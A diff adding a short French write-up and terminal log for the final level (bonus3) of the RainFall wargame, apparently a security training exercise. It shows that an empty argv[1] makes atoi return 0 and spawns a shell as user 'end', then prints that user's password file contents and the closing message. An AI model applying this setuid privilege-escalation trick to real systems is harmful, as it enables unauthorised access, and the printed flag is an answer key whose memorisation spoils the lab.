@@ -1,0 +1,26 @@
+Dernier programme du projet, et nous avons un manque flagrant d'interaction possible avec celui-ci. Cependant, afin d'atteindre bin sh nous pouvons nous focaliser sur la variable de comparaisont, qui est affectee par le atoi de argv[1], et la seule maniere de qu'on ces deux variable d'echanger entre elles et d'annuler le atoi avec un argv[1] vide mais pas NULL.
+
+bonus3@RainFall:~$ ./bonus3 "\x00"
+-
+bonus3@RainFall:~$ ./bonus3 ""
+$ whoami
+end
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+$
+bonus3@RainFall:~$ su end
+Password:
+end@RainFall:~$ ls -lah
+total 13K
+dr-xr-x---+ 1 end  end     80 Sep 23  2015 .
+dr-x--x--x  1 root root   340 Sep 23  2015 ..
+-rw-r--r--  1 end  end    220 Apr  3  2012 .bash_logout
+-rw-r--r--  1 end  end   3.5K Sep 23  2015 .bashrc
+-r--r-----+ 1 end  end     65 Sep 23  2015 .pass
+-rw-r--r--  1 end  end    675 Apr  3  2012 .profile
+-rwsr-s---+ 1 end  users   26 Sep 23  2015 end
+end@RainFall:~$ cat end
+Congratulations graduate!
+end@RainFall:~$ xxd end
+0000000: 436f 6e67 7261 7475 6c61 7469 6f6e 7320  Congratulations
+0000010: 6772 6164 7561 7465 210a                 graduate!.
